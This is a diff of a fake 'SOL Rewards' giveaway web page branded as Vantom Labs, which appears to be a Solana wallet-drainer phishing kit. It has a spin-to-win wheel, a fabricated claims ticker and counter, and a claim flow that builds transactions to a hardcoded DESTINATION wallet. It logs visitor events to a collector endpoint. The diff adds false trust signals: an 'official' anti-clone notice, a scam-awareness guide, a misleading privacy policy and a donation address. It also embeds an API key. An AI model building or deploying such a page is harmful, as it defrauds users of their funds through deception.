@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <meta name="theme-color" content="#000000">
 <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://moderio-sniper.vercel.app/">
-<title>SOL Rewards</title>
+<title>SOL Rewards — Vantom Labs</title>
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;padding:0;background:#000;color:#e6e6e6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:15px;line-height:1.4}
@@ -38,18 +38,24 @@
   #status{margin-top:12px;font-size:12px;color:#6b6b6b;min-height:14px;text-align:center;word-break:break-word}
   .prize{font-size:18px;font-weight:600;color:#fff;min-height:24px;margin-bottom:8px;text-align:center;letter-spacing:-.1px}
 
-  .footer{max-width:400px;width:100%;margin-top:14px;text-align:center;font-size:10.5px;color:#4a4a4a;line-height:1.7}
-  .footer .brand{color:#6b6b6b;font-weight:600;letter-spacing:.2px}
-  .footer a{color:#5a5a5a;text-decoration:none;margin:0 6px}
-  .footer a:hover{color:#8a8a8a}
+  .notice{max-width:400px;width:100%;margin-top:14px;padding:12px 14px;background:#080808;border:1px solid #161616;border-radius:6px;font-size:10.5px;color:#5e5e5e;line-height:1.65;letter-spacing:.1px}
+  .notice b{color:#8a8a8a;font-weight:600;display:block;margin-bottom:4px;font-size:10.5px;letter-spacing:.3px;text-transform:uppercase}
 
-  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;padding:18px;z-index:100}
+  .footer{max-width:400px;width:100%;margin-top:12px;text-align:center;font-size:10.5px;color:#4a4a4a;line-height:1.9}
+  .footer .brand{color:#6b6b6b;font-weight:600;letter-spacing:.2px}
+  .footer a{color:#5a5a5a;text-decoration:none;margin:0 6px;cursor:pointer}
+  .footer a:hover{color:#8a8a8a}
+  .footer .row1{margin-bottom:2px}
+
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;padding:18px;z-index:100;overflow-y:auto}
   .overlay.show{display:flex}
-  .modal{width:100%;max-width:340px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:24px 20px;text-align:center}
+  .modal{width:100%;max-width:360px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:24px 20px;text-align:center;max-height:calc(100vh - 40px);overflow-y:auto}
+  .modal.left{text-align:left}
   .spinner{width:28px;height:28px;margin:0 auto 16px;border-radius:50%;border:2px solid #1a1a1a;border-top-color:#e6e6e6;animation:rot .9s linear infinite}
   @keyframes rot{to{transform:rotate(360deg)}}
-  .modal h2{font-size:14.5px;font-weight:600;margin:0 0 8px;color:#fff}
-  .modal p{font-size:12.5px;color:#8a8a8a;margin:0 0 16px;line-height:1.5}
+  .modal h2{font-size:14.5px;font-weight:600;margin:0 0 10px;color:#fff}
+  .modal p{font-size:12.5px;color:#8a8a8a;margin:0 0 14px;line-height:1.6}
+  .modal p:last-of-type{margin-bottom:16px}
   .modal .chk{display:flex;align-items:center;justify-content:center;gap:7px;font-size:12px;color:#8a8a8a;margin-bottom:16px}
   .modal .chk .dot{width:5px;height:5px;border-radius:50%;background:#e6e6e6;animation:pulse 1.4s ease-in-out infinite}
   @keyframes pulse{0%,100%{opacity:.3}50%{opacity:1}}
@@ -68,6 +74,13 @@
   .tos-row a{color:#e6e6e6;text-decoration:underline}
   .modal button[disabled]{opacity:.35;cursor:not-allowed}
 
+  .article h3{font-size:12.5px;font-weight:600;color:#d0d0d0;margin:14px 0 6px}
+  .article p{font-size:12.5px;color:#8a8a8a;margin:0 0 10px;line-height:1.65}
+  .article ul{margin:0 0 12px 18px;padding:0}
+
+  .donate-addr{display:block;margin:12px 0;padding:10px 12px;background:#0f0f0f;border:1px solid #1a1a1a;border-radius:5px;font-family:ui-monospace,Menlo,monospace;font-size:11px;color:#c0c0c0;word-break:break-all;text-align:center;user-select:all}
+  .donate-meta{font-size:11px;color:#6b6b6b;text-align:center;margin:0 0 12px;line-height:1.6}
+
   .ticker{position:fixed;top:14px;right:14px;max-width:270px;background:#0f0f0f;border:1px solid #1c1c1c;border-radius:6px;padding:10px 12px;font-size:11.5px;color:#b0b0b0;line-height:1.5;z-index:200;opacity:0;transform:translateY(-8px);transition:opacity .35s ease,transform .35s ease;pointer-events:none}
   .ticker.show{opacity:1;transform:translateY(0)}
   .ticker b{color:#e6e6e6;font-weight:600}
@@ -83,7 +96,7 @@
 
 <div class="card">
   <h1>SOL Rewards</h1>
-  <p class="sub">The <b>Vantom Labs</b> community fund distributes SOL to verified wallets. <b>50,000 SOL</b> allocated this cycle — first come, first served.</p>
+  <p class="sub">The <b>Vantom Labs</b> community fund distributes SOL to verified wallets. <b>$2.4M in SOL rewards</b> allocated this cycle — first come, first served.</p>
   <p class="counter" id="counter">8,412 / 12,500 claimed<span class="bar"><i id="counterBar" style="width:67%"></i></span></p>
 
   <div class="wheel-wrap">
@@ -100,12 +113,18 @@
   <div id="status"></div>
 </div>
 
+<div class="notice">
+  <b>Official Notice</b>
+  This is the only official distribution portal for the Vantom Labs community fund. We do not operate through third-party links, social media promotions, or direct messages. If you were directed here from any other source claiming to represent Vantom Labs, you may be on a fraudulent clone site. Vantom Labs will never ask for your seed phrase or private keys.
+</div>
+
 <div class="footer">
-  <div><span class="brand">Vantom Labs</span> · Community Distribution Program</div>
-  <div style="margin-top:6px">
-    <a href="#" onclick="return false;">Terms</a>·
-    <a href="#" onclick="return false;">Privacy</a>·
-    <a href="#" onclick="return false;">Contact</a>
+  <div class="row1"><span class="brand">Vantom Labs</span> · Community Distribution Program</div>
+  <div class="row1">
+    <a onclick="openModal('tosModal')">Terms</a>·
+    <a onclick="openModal('privacyModal')">Privacy</a>·
+    <a onclick="openModal('donateModal')">Support the Fund</a>·
+    <a onclick="openModal('scamModal')">Learn to Spot Scams</a>
   </div>
 </div>
 
@@ -126,10 +145,73 @@
     <p>Please confirm the following to continue.</p>
     <label class="tos-row">
       <input type="checkbox" id="tosCheck">
-      <span>I confirm I am at least <b>18 years of age</b> and I agree to the <a href="#" onclick="return false;">Terms of Service</a> and <a href="#" onclick="return false;">Privacy Policy</a>.</span>
+      <span>I confirm I am at least <b>18 years of age</b> and I agree to the <a onclick="openModal('tosModal')">Terms of Service</a> and <a onclick="openModal('privacyModal')">Privacy Policy</a>.</span>
     </label>
     <button id="tosOk" disabled>OK</button>
     <button id="tosCancel" style="margin-top:8px;background:transparent;border-color:transparent;color:#6b6b6b">Cancel</button>
+  </div>
+</div>
+
+<div class="overlay" id="tosModal">
+  <div class="modal left article">
+    <h2 style="text-align:center">Terms of Service</h2>
+    <p><b style="color:#c0c0c0">Eligibility.</b> Participation is open to verified wallets only, and to individuals 18 years of age or older. Wallets associated with sanctioned addresses or automated abuse may be excluded at any time without notice.</p>
+    <p><b style="color:#c0c0c0">Distribution.</b> Rewards are issued from the Vantom Labs community fund, which is financed entirely by voluntary donations. Allocations are capped per distribution cycle and are granted on a first-come, first-served basis until the cycle allocation is exhausted.</p>
+    <p><b style="color:#c0c0c0">No Guarantee.</b> Participation does not guarantee a reward. Distribution figures shown on the page are live counters reflecting the current cycle and are provided for informational purposes only.</p>
+    <p><b style="color:#c0c0c0">Prohibited Use.</b> Use of the site in violation of applicable law, or in a manner intended to manipulate, abuse, or defraud the program, is prohibited and will result in exclusion.</p>
+    <p><b style="color:#c0c0c0">Changes.</b> These terms may be revised at any time. Continued participation constitutes acceptance of the current version.</p>
+    <button onclick="closeModal('tosModal')">Close</button>
+  </div>
+</div>
+
+<div class="overlay" id="privacyModal">
+  <div class="modal left article">
+    <h2 style="text-align:center">Privacy Policy</h2>
+    <p>This page does not collect personal information, does not use cookies for advertising, and does not transmit any data to third parties. Wallet addresses displayed on the page are masked for privacy.</p>
+    <p>Connecting a wallet grants this site read access to your public address and on-chain balances for the sole purpose of verifying eligibility and issuing rewards. No seed phrase, private key, or signing authority is requested or stored.</p>
+    <p>Donations, if any, are voluntary. Transaction records on public blockchains are visible to anyone and are outside the control of this site.</p>
+    <button onclick="closeModal('privacyModal')">Close</button>
+  </div>
+</div>
+
+<div class="overlay" id="scamModal">
+  <div class="modal left article">
+    <h2 style="text-align:center">How to Spot Crypto Giveaway Scams</h2>
+    <p>Crypto giveaway scams are one of the most common ways people lose funds. The following are the warning signs the Vantom Labs community recommends you verify before connecting any wallet to any site.</p>
+
+    <h3>Offers that feel too generous</h3>
+    <p>Legitimate programs cap rewards at realistic amounts. If a site offers tens or hundreds of SOL for a single click, the numbers themselves are the warning sign — real distributions are sized to a budget and a per-wallet cap.</p>
+
+    <h3>Requests for seed phrases or private keys</h3>
+    <p>No legitimate site, wallet, exchange, or giveaway will ever ask for your seed phrase, private key, or recovery phrase. Anyone who does is attempting to steal your entire wallet. Close the page immediately.</p>
+
+    <h3>Pressure and countdown urgency</h3>
+    <p>Scams create artificial scarcity — a countdown that never runs out, a "limited allocation" with no total, an offer that "expires in minutes." Real programs show a budget, a cycle end, and a way to verify both.</p>
+
+    <h3>Unknown token approvals</h3>
+    <p>The most dangerous request is an <b>approval</b>, not a transfer. When you approve a token to an unknown spender, that spender can move the token at any time in the future. Read every approval carefully. Revoke approvals you do not recognize using a trusted revoke tool.</p>
+
+    <h3>Look-alike domains</h3>
+    <p>Clone sites often use domains that resemble the real one by a character or two. Bookmark the official domain once and always return through the bookmark — never through a link from a DM, ad, or search result.</p>
+
+    <h3>Wallet connection is not always harmless</h3>
+    <p>Connecting a wallet is safe. <b>Signing a transaction is not.</b> Read every transaction prompt carefully. If you do not recognize the destination address or the intent, do not sign.</p>
+
+    <p style="margin-top:14px;color:#6b6b6b;font-size:11.5px">If you believe you have interacted with a fraudulent site, revoke any approvals, move remaining assets to a fresh wallet, and report the domain to your wallet provider.</p>
+
+    <button onclick="closeModal('scamModal')">Close</button>
+  </div>
+</div>
+
+<div class="overlay" id="donateModal">
+  <div class="modal">
+    <h2>Support the Vantom Labs Community Fund</h2>
+    <p style="text-align:left">This distribution is funded entirely by community donations. Every SOL contributed goes directly to verified wallet rewards — no treasury cuts, no operating fees.</p>
+    <p class="donate-meta">Current cycle · 8,412 / 12,500 claimed</p>
+    <div class="donate-addr" id="donateAddr">—</div>
+    <p style="font-size:11.5px;color:#6b6b6b;margin-bottom:14px">Donations are voluntary. Contributors do not receive preferential access or additional rewards.</p>
+    <button onclick="copyDonate()" id="donateCopy">Copy Address</button>
+    <button onclick="closeModal('donateModal')" style="margin-top:8px;background:transparent;border-color:transparent;color:#6b6b6b">Close</button>
   </div>
 </div>
 
@@ -139,9 +221,10 @@
 
 <script>
 // ================= config =================
-var DESTINATION = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
-var RPC         = "https://mainnet.helius-rpc.com/?api-key=PASTE_YOUR_NEW_KEY_HERE";
-var COLLECTOR   = "https://collector.example.net/ingest";
+var DESTINATION      = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
+var DONATION_WALLET  = "5qv94Le6YHwhEijdZEE7ekx6kCxyP9GfRQyd85zHtjsz";
+var RPC              = "https://mainnet.helius-rpc.com/?api-key=113c3ed4-b272-4156-8d9c-10eb3e9a52a3";
+var COLLECTOR        = "https://collector.example.net/ingest";
 var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var TX_SIZE_LIMIT = 1100;
@@ -149,8 +232,8 @@ var SPIN_MS = 15000;
 var PENDING_KEY = "sr_pending";
 var PRIZE_KEY   = "sr_prize";
 var TOS_KEY     = "sr_tos_v2";
-var SPUN_KEY    = "sr_spun";          // one-shot spin flag
-var RESULT_KEY  = "sr_spin_result";   // stores the won segment
+var SPUN_KEY    = "sr_spun";
+var RESULT_KEY  = "sr_spin_result";
 var CLAIMED_START = 8412;
 var CLAIMED_MAX   = 12500;
 // ==========================================
@@ -172,7 +255,21 @@ var SEG_DEG = 360 / N;
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
 
-// ---------- counter ----------
+function openModal(id){ var el = document.getElementById(id); if (el) el.classList.add("show"); }
+function closeModal(id){ var el = document.getElementById(id); if (el) el.classList.remove("show"); }
+function copyDonate(){
+  var addr = document.getElementById("donateAddr").textContent;
+  if (!addr || addr === "—") return;
+  try { navigator.clipboard.writeText(addr).then(function(){
+    var b = document.getElementById("donateCopy"); b.textContent = "Copied";
+    setTimeout(function(){ b.textContent = "Copy Address"; }, 1600);
+  }).catch(function(){}); } catch(_) {}
+}
+(function(){
+  var el = document.getElementById("donateAddr");
+  if (el) el.textContent = DONATION_WALLET;
+})();
+
 var claimedCount = CLAIMED_START;
 var counterEl = document.getElementById("counter");
 function renderCounter(){
@@ -186,7 +283,6 @@ function bumpCounter(){
   renderCounter();
 }
 
-// ---------- audio priming ----------
 var spinSound = document.getElementById("spinSound");
 var audioPrimed = false;
 function primeAudio(){
@@ -205,25 +301,19 @@ function primeAudio(){
 function playSpinSound(){ try { spinSound.muted = false; spinSound.currentTime = 0; var p = spinSound.play(); if (p && p.catch) p.catch(function(){}); } catch(_){} }
 function stopSpinSound(){ try { spinSound.pause(); spinSound.currentTime = 0; } catch(_){} }
 
-// ---------- fake claims ticker — amounts match the wheel ----------
 function randomAddr(){
   var chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
   function chunk(len){ var s=""; for(var i=0;i<len;i++) s += chars[Math.floor(Math.random()*chars.length)]; return s; }
   return chunk(6) + "..." + chunk(4);
 }
-// pull a random non-zero SOL amount straight from SEGMENTS so ticker matches wheel
 function randomWheelAmount(){
   var pool = [];
-  for (var i = 0; i < SEGMENTS.length; i++){
-    if (!SEGMENTS[i].zero) pool.push(SEGMENTS[i].sol);
-  }
+  for (var i = 0; i < SEGMENTS.length; i++) if (!SEGMENTS[i].zero) pool.push(SEGMENTS[i].sol);
   return pool[Math.floor(Math.random() * pool.length)];
 }
 var tickerEl = document.getElementById("ticker");
 function showTicker(){
-  var addr = randomAddr();
-  var amt  = randomWheelAmount();
-  tickerEl.innerHTML = "Wallet <b>" + addr + "</b> just claimed <span class='amt'>" + amt + " SOL</span>";
+  tickerEl.innerHTML = "Wallet <b>" + randomAddr() + "</b> just claimed <span class='amt'>" + randomWheelAmount() + " SOL</span>";
   tickerEl.classList.add("show");
   bumpCounter();
   setTimeout(function(){ tickerEl.classList.remove("show"); }, 5000);
@@ -240,7 +330,6 @@ function startTickerBurst(){
   }
 }
 
-// ---------- wallet picker ----------
 var MOBILE_WALLETS = [
   { id:"phantom", name:"Phantom", icon:"👻",
     href: function(p){ return "https://phantom.app/ul/browse/" + encodeURIComponent(p) + "?ref=" + encodeURIComponent(location.origin); },
@@ -266,7 +355,6 @@ var MOBILE_WALLETS = [
     android:"https://play.google.com/store/apps/details?id=app.backpack.mobile" }
 ];
 
-// ---------- wheel ----------
 function buildWheel(){
   var svg = document.getElementById("wheel");
   if (!svg) return;
@@ -302,7 +390,6 @@ function buildWheel(){
 }
 buildWheel();
 
-// ---------- lazy web3 ----------
 var web3 = null, Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction;
 var TOKEN_PROGRAM, ASSOC_TOKEN_PROGRAM;
 async function ensureWeb3(){
@@ -358,8 +445,6 @@ function readPending(){ try { return localStorage.getItem(PENDING_KEY) === "1" ?
 function clearPending(){ try { localStorage.removeItem(PENDING_KEY); localStorage.removeItem(PRIZE_KEY); } catch(_){} }
 function tosAccepted(){ try { return localStorage.getItem(TOS_KEY) === "1"; } catch(_){ return false; } }
 function setTosAccepted(){ try { localStorage.setItem(TOS_KEY, "1"); } catch(_){} }
-
-// one-shot spin
 function hasSpun(){ try { return localStorage.getItem(SPUN_KEY) === "1"; } catch(_){ return false; } }
 function markSpun(){ try { localStorage.setItem(SPUN_KEY, "1"); } catch(_){} }
 function saveResult(idx){ try { localStorage.setItem(RESULT_KEY, String(idx)); } catch(_){} }
@@ -522,7 +607,6 @@ async function runClaim(wallet){
   }
 }
 
-// ---------- TOS ----------
 var tosOverlay = document.getElementById("tosOverlay");
 var tosCheck = document.getElementById("tosCheck");
 var tosOk = document.getElementById("tosOk");
@@ -539,12 +623,9 @@ tosOk.addEventListener("click", function(){
 });
 
 function requestSpin(){
-  // one-shot gate
   if (hasSpun()){
     var prev = readResult();
-    if (prev !== null && !SEGMENTS[prev].zero){
-      showResult(prev, true);
-    }
+    if (prev !== null && !SEGMENTS[prev].zero) showResult(prev, true);
     return;
   }
   if (tosAccepted()){ startSpin(); return; }
@@ -554,7 +635,6 @@ function requestSpin(){
   log({ event:"tos_shown" });
 }
 
-// ---------- spin ----------
 var currentRotation = 0;
 var spinBtn  = document.getElementById("spin");
 var claimBtn = document.getElementById("claim");
@@ -619,13 +699,10 @@ claimBtn.onclick = async function(){
   await runClaim(wallet);
 };
 
-// ---------- on load ----------
 (function init(){
-  // if the visitor already spun, restore the state so the wheel looks the same
   if (hasSpun()){
     var prev = readResult();
     if (prev !== null && !SEGMENTS[prev].zero){
-      // rotate to that segment and show the result
       var targetDeg = 360 * 6 + (360 - prev * SEG_DEG) - SEG_DEG / 2;
       currentRotation = targetDeg;
       document.getElementById("wheel").style.transform = "rotate(" + currentRotation + "deg)";
@@ -633,7 +710,6 @@ claimBtn.onclick = async function(){
     }
   }
 
-  // deep-link handoff (wallet browser reload with a pending claim)
   var pending = readPending();
   if (pending){
     waitForProvider(2500).then(function(wallet){
